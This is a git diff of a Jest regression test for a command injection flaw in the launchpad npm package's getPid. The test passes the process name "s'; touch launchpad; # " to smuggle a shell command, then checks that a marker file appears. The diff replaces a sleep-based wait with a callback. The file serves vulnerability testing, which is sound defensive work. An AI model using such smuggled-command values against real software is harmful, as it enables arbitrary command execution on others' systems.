@@ -1,12 +1,13 @@
 //https://github.com/bitovi/launchpad/pull/124
-test("Command Injection in launchpad", () => {
-  const launchpad = require("./node_modules/launchpad/lib/local/instance");
+test("Command Injection in launchpad", (done) => {  
+  const path = require("path");
   const fs = require("fs");
-  const path = "./launchpad";
-  const sleep = require("sleep");
 
-  //checking that its not present already
-  file_exist = fs.existsSync(path);
+  const launchpad = require(path.resolve(__dirname, "./node_modules/launchpad/lib/local/instance"));  
+  const pathToFlag = path.resolve(__dirname, "./launchpad");
+  
+  // checking that its not present already
+  let file_exist = fs.existsSync(pathToFlag);
   expect(file_exist).toBe(false);
 
   let tst = new launchpad.Instance(
@@ -15,14 +16,11 @@ test("Command Injection in launchpad", () => {
     {},
     { process: "s'; touch launchpad; # " }
   );
-  try {
-    tst.getPid(function () {});
-  } catch (error) {}
+  tst.getPid(() => {
+    file_exist = fs.existsSync(pathToFlag);    
+    expect(file_exist).toBe(true);
+    fs.unlink(pathToFlag, function () { done(); }); // deleting the file after creation
+    done();
+  });
 
-  sleep.sleep(2);
-  //checking that its created by after exploit.
-  file_exist = fs.existsSync(path);
-  expect(file_exist).toBe(true);
-
-  fs.unlink(path, function (err) {}); //deleting the file after creation
 });
